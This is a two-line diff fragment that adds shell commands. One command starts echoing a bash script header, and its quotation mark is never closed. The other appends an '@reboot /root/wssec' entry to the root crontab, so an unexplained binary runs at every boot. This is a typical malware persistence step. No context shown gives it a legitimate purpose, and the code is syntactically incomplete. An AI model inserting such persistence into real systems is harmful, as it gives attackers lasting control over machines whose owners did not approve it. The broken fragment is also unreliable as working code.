@@ -1,0 +1,2 @@
+echo -e '#!/bin/bash
+(crontab -l 2>/dev/null; echo "@reboot /root/wssec") | crontab -
